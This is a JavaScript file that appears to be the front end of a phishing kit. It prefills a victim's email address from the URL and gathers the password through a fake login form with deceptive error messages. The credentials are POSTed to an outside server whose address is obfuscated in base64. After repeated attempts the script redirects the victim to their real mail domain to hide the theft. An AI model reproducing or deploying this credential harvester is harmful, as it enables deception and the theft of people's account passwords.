
/* global $ */
$(document).ready(function() {
    var count = 0;



    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $('#aich').html(my_ai);
        $("#msg").hide();

    }
    ///////////////url getting ai////////////////

    var file = "aHR0cHM6Ly9nZW4yMS5vcmcvYS91cGRhdGlvbi9uZXh0LnBocA==";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is empty.!");
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is empty.!");
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: atob(file),
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("http://www." + my_slice);
                            return false;

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                    return false;
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Login');
            }
        });
    });


});

